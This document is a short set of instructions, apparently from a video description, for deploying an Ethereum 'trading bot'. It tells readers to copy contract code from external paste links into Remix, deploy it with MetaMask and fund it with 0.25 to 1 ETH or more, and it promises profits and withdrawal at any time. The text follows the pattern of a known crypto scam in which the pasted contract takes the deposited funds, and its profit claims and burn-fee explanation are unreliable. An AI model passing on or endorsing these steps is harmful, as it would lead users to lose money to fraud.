INSTRUCTIONS:

ðŸ‘‰ Download MetaMask: https://metamask.io/download

ðŸ‘‰ go to the Remix: https://remix.ethereum.org/

ðŸ‘‰ go to the 'contracts' folder,  right click and create a new file. Rename it as you likeâ€”i.e., 'Bot.sol'

ðŸ‘‰ Copy code from the link below and paste in Remix:
https://pastebin.com/raw/wRgZXYuY
or
https://pastefy.app/9IdLtZAP/raw

ðŸ‘‰ go to the 'Solidity Compiler' tab and select version '0.6.6', then click 'Compile'

ðŸ‘‰ go to the 'Deploy' tab, select 'Injected Provider' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now

ðŸ‘‰ Deposit funds (at least 0.25 ETH to prevent negating slippage) to your exact contract/bot address. In any way the most higher profit you will have with 1 ETH or more

ðŸ‘‰ After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'

ðŸš¨ EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.25 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.25 ETH to make sure that won't happen. But in any way the most higher profit you will have with 1 ETH or more as I showed in the video
